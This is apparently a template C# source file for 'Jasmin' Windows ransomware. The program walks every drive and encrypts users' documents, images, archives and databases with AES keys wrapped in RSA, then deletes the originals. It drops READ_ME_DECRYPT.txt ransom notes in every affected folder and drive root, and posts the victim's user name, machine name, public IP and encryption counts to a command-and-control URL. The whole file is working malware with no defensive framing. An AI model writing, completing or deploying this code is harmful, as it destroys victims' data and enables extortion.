// Jasmin Windows Payload — Auto-generated
// Compile: csc /target:winexe /out:payload.exe this_file.cs
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Threading;
using System.Collections.Generic;
using System.Management;
using System.Runtime.InteropServices;

namespace JasminPayload {
class P {
static string C2="{{C2_URL}}";
static string SECRET="{{HANDSHAKE}}";
static string PUB=@"{{RSA_PUBLIC_KEY}}";

[DllImport("kernel32.dll")] static extern bool AttachConsole(int dwProcessId);
[DllImport("kernel32.dll")] static extern bool FreeConsole();

static string[] SKIP_DIRS={@"\Windows",@"\Program Files",@"\Program Files (x86)",
  @"\ProgramData",@"\$Recycle.Bin",@"\System Volume Information",
  @"\Recovery",@"\Boot",@"\EFI"};
static HashSet<string> SKIP_EXT=new HashSet<string>(StringComparer.OrdinalIgnoreCase){
  ".sys",".dll",".exe",".msi",".drv",".ini",".lnk",".bat",".cmd",
  ".rdp",".msc",".cpl",".scr",".efi",".dat",".log",".reg",".mui"};
static string[] EXTS={"*.pptx","*.docx","*.xlsx","*.txt","*.pdf","*.csv",
  "*.jpg","*.jpeg","*.png","*.zip","*.rar","*.7z","*.mp3","*.mp4",
  "*.sql","*.bak","*.html","*.php","*.py","*.java","*.json","*.xml"};

static bool Skip(string p){
  string f=Path.GetFullPath(p);
  if(f.EndsWith(".jasmin",StringComparison.OrdinalIgnoreCase))return true;
  string r=Path.GetPathRoot(f)??@"C:\";
  foreach(var d in SKIP_DIRS)if(f.StartsWith(r+d.TrimStart('\\'),StringComparison.OrdinalIgnoreCase))return true;
  if(SKIP_EXT.Contains(Path.GetExtension(f)))return true;
  string n=Path.GetFileName(f);
  if(n.StartsWith("ntuser",StringComparison.OrdinalIgnoreCase)||n.Equals("bootmgr",StringComparison.OrdinalIgnoreCase))return true;
  return false;
}

static byte[] AesEnc(byte[] data,byte[] key,byte[] iv){
  using(var a=Aes.Create()){a.KeySize=256;a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;a.Key=key;a.IV=iv;
  using(var ms=new MemoryStream())using(var cs=new CryptoStream(ms,a.CreateEncryptor(),CryptoStreamMode.Write)){
  cs.Write(data,0,data.Length);cs.FlushFinalBlock();return ms.ToArray();}}}

static byte[] RsaEnc(byte[] data){
  using(var rsa=RSA.Create()){rsa.ImportFromPem(PUB);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}

static System.Collections.Generic.Dictionary<string,int> FAILS=new System.Collections.Generic.Dictionary<string,int>();
static void NoteFail(string why){lock(FAILS){int v;FAILS.TryGetValue(why,out v);FAILS[why]=v+1;}}
static void ReportFails(){
  if(FAILS.Count==0)return;
  try{
    int tot=0;foreach(var kv in FAILS)tot+=kv.Value;
    Console.Error.WriteLine("[jasmin] !!! "+tot+" operation(s) failed. Reason breakdown:");
    foreach(var kv in FAILS)Console.Error.WriteLine("[jasmin] !!!   "+kv.Value+" time(s) - "+kv.Key);
    Console.Error.WriteLine("[jasmin] !!! Check: free disk space, whether the volume is read-only/write-protected, file permissions, path length");
  }catch{}
}

static bool Enc(string path){
  try{
    if(Skip(path))return false;
    byte[] p=File.ReadAllBytes(path);if(p.Length==0)return false;
    byte[] h;using(var s=SHA256.Create())h=s.ComputeHash(p);
    byte[] k=new byte[32],iv=new byte[16];
    using(var rng=RandomNumberGenerator.Create()){rng.GetBytes(k);rng.GetBytes(iv);}
    byte[] ct=AesEnc(p,k,iv);
    byte[] km=new byte[48];Buffer.BlockCopy(k,0,km,0,32);Buffer.BlockCopy(iv,0,km,32,16);
    byte[] ek=RsaEnc(km);
    using(var fs=new FileStream(path+".jasmin",FileMode.Create)){
      fs.Write(h,0,32);fs.Write(ct,0,ct.Length);fs.Write(ek,0,ek.Length);
      fs.Write(BitConverter.GetBytes(ek.Length),0,4);}
    File.Delete(path);
    return true;
  }catch(Exception ex){
    string w;
    if(ex is UnauthorizedAccessException)w="Access denied (UnauthorizedAccessException) - cannot write to that directory";
    else if(ex is PathTooLongException)w="Path too long (PathTooLongException)";
    else if(ex is System.IO.DirectoryNotFoundException)w="Directory not found (DirectoryNotFoundException)";
    else if(ex is System.IO.IOException){
      string m=ex.Message;
      if(m.IndexOf("space",StringComparison.OrdinalIgnoreCase)>=0||m.IndexOf("磁盘空间")>=0)
        w="Insufficient disk space (IOException) - each file needs an equally sized .jasmin copy; free space equal to the target data is required";
      else w="IO error (IOException): "+m;
    }
    else w=ex.GetType().Name+": "+ex.Message;
    NoteFail(w);
    return false;
  }}

// ── 进度条 ──
static long P_DONE=0, P_BYTES=0, P_OK=0;
static long P_TOTAL=0, P_TOTAL_BYTES=0;
static long P_LAST_BEACON=0;
static bool P_CONSOLE=false;
static object P_LK=new object();

static string FmtB(long b){
  string[] u={"B","KB","MB","GB","TB","PB"};
  double d=b;int i=0;
  while(d>=1024 && i<5){d/=1024;i++;}
  return i==0?((long)d)+u[i]:d.ToString("0.00")+u[i];
}

static void DrawBar(string cur){
  if(!P_CONSOLE)return;
  double pct = P_TOTAL_BYTES>0 ? (P_BYTES*100.0/P_TOTAL_BYTES)
             : (P_TOTAL>0 ? (P_DONE*100.0/P_TOTAL) : 100.0);
  if(pct>100)pct=100;
  int barw=28, fill=(int)(pct*barw/100);
  string bar=new string('█',fill)+new string('░',barw-fill);
  if(cur!=null && cur.Length>34)cur="…"+cur.Substring(cur.Length-33);
  try{
    int cols=100;try{cols=Console.WindowWidth;}catch{}
    string line=string.Format("  [{0}] {1,5:0.0}%  {2}/{3}  {4}/{5}  {6}",
      bar,pct,P_DONE,P_TOTAL,FmtB(P_BYTES),FmtB(P_TOTAL_BYTES),cur??"");
    if(line.Length>cols-1)line=line.Substring(0,cols-1);
    Console.Error.Write("\r"+line);
    Console.Error.Flush();
  }catch{}
}

static void Tick(string path,long size,bool ok){
  long done,bytes,total,tb;
  lock(P_LK){
    P_DONE++;P_BYTES+=size;if(ok)P_OK++;
    done=P_DONE;bytes=P_BYTES;total=P_TOTAL;tb=P_TOTAL_BYTES;
  }
  DrawBar(path);
  long now=DateTime.UtcNow.Ticks/TimeSpan.TicksPerSecond;  // 兼容 .NET 4.0+（不用 ToUnixTimeSeconds）
  if(now-P_LAST_BEACON>=8){
    P_LAST_BEACON=now;
    // 周期性回传进度（后台，不阻塞加密）
    int d=(int)done,okc=(int)P_OK,tc=(int)total;
    long by=bytes,tbs=tb;
    System.Threading.Tasks.Task.Run(()=>Beacon(d,by,"","{}",false,tc,tbs));
  }
}

static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool complete=true,int totalCnt=0,long totalSz=0){
  try{
    string u=Environment.UserName,m=Environment.MachineName;
    string t=DateTime.Now.ToString("HH:mm:ss"),d=DateTime.Today.ToString("dd/MM/yyyy")+", "+DateTime.Now.DayOfWeek;
    string ip="0.0.0.0";try{ip=new WebClient().DownloadString("https://api.ipify.org").Trim();}catch{}
    var c=new HttpClient();
    var kv=new List<KeyValuePair<string,string>>{
      new("machine_name",m),new("computer_user",u),new("systemid",SID),
      new("os","Windows "+Environment.OSVersion.Version),new("date",d),new("time",t),
      new("ip",ip),new("location","?"),new("password","RSA_PROTECTED"),new("handshake",SECRET),
      new("encrypted_count",cnt.ToString()),new("encrypted_size",sz.ToString()),
      new("encrypted_types",types),new("encrypted_detail",detail),
      new("is_complete",complete?"1":"0"),
      new("total_count",(totalCnt>0?totalCnt:cnt).ToString()),
      new("total_size",(totalSz>0?totalSz:sz).ToString())};
    c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
  }catch(Exception ex){if(P_CONSOLE){try{
    Console.Error.WriteLine("[jasmin] !!! Beacon failed: "+C2);
    Console.Error.WriteLine("[jasmin] !!! "+ex.Message);
    Console.Error.WriteLine("[jasmin] !!! Check the C2 URL, the port (this service listens on :8080), and the handshake secret");
  }catch{}}}}

static string SID="";
static string NOTE=@"
{{RANSOM_NOTE}}
";

static System.Collections.Generic.HashSet<string> NOTE_DIRS=new System.Collections.Generic.HashSet<string>();

static void DropNotes(){
  string txt=NOTE.Replace("{SID}",SID);
  int wrote=0;
  string[] dirs={
    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
  foreach(string d in dirs){
    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("Ransom note drop failed (disk full / read-only / permission): "+ex.GetType().Name);}}
  // 被加密文件所在的每个目录 —— 勒索信必须全部覆盖（原实现只投根目录，用户看不到）
  foreach(string d in NOTE_DIRS){
    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("Ransom note drop failed (disk full / read-only / permission): "+ex.GetType().Name);}}
  foreach(DriveInfo dr in DriveInfo.GetDrives()){
    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch(Exception ex){NoteFail("Ransom note drop failed (drive root / read-only): "+ex.GetType().Name);}}
  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Ransom note dropped in "+wrote+" location(s)");}catch{}}
}

// ── 预扫描：只统计数量与总字节，不保存路径列表 ──
static void ScanTargets(){
  try{P_CONSOLE=AttachConsole(-1);}catch{P_CONSOLE=false;}
  foreach(var dr in DriveInfo.GetDrives()){
    try{foreach(string ext in EXTS){
      try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
        if(Skip(f))continue;
        long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
        P_TOTAL++;P_TOTAL_BYTES+=fsz;
      }}catch{}}}catch{}}
}

static void Preflight(){
  try{
    foreach(var dr in DriveInfo.GetDrives()){
      try{
        if(!dr.IsReady)continue;
        long need=P_TOTAL_BYTES;
        if(need>0&&dr.AvailableFreeSpace<need+need/20){
          if(P_CONSOLE)Console.Error.WriteLine("[jasmin] !!! Preflight warning: "+dr.Name+" has "+FmtB(dr.AvailableFreeSpace)+" free < ~"+FmtB(need)+" required (each file needs an equally sized .jasmin copy; insufficient space causes widespread failures)");
        }
      }catch{}
    }
  }catch{}
}

static void Main(){
  try{var mc=new ManagementClass("Win32_LogicalDisk");
    foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}

  ScanTargets();
  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] Found "+P_TOTAL+" target file(s), "+FmtB(P_TOTAL_BYTES)+" total);}catch{}}
  Preflight();

  long encCount=0,encSize=0;
  var encTypes=new System.Collections.Generic.HashSet<string>();
  var typeSizes=new System.Collections.Generic.Dictionary<string,long[]>();
  var tasks=new System.Collections.Generic.List<System.Threading.Tasks.Task>();
  object lk=new object();

  foreach(var dr in DriveInfo.GetDrives()){
    try{foreach(string ext in EXTS){
      try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
        if(Skip(f))continue;
        long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
        string fc=f;long fszc=fsz;
        tasks.Add(System.Threading.Tasks.Task.Run(()=>{
          bool ok=Enc(fc);
          Tick(fc,fszc,ok);
          if(ok){lock(lk){encCount++;encSize+=fszc;
            try{string nd=Path.GetDirectoryName(fc);if(!string.IsNullOrEmpty(nd))NOTE_DIRS.Add(nd);}catch{}
            string e=Path.GetExtension(fc).ToLower();encTypes.Add(e);
            if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
            typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
        }));
      }}catch{}}}catch{}}
  System.Threading.Tasks.Task.WaitAll(tasks.ToArray());
  if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] Encryption complete: "+encCount+"/"+P_TOTAL+" file(s), "+FmtB(encSize)+" / "+FmtB(P_TOTAL_BYTES));}catch{}}
  ReportFails();

  DropNotes();
  // 构建detail JSON
  var sb=new System.Text.StringBuilder("{");
  bool first=true;
  foreach(var kv2 in typeSizes){
    if(!first)sb.Append(",");
    sb.Append($"\"{kv2.Key}\":{{\"count\":{kv2.Value[0]},\"size\":{kv2.Value[1]}}}");
    first=false;}
  sb.Append("}");
  Beacon((int)encCount,encSize,string.Join(",",encTypes),sb.ToString(),true,(int)P_TOTAL,P_TOTAL_BYTES);
  try{if(P_CONSOLE)FreeConsole();}catch{}
}}} // end class, namespace
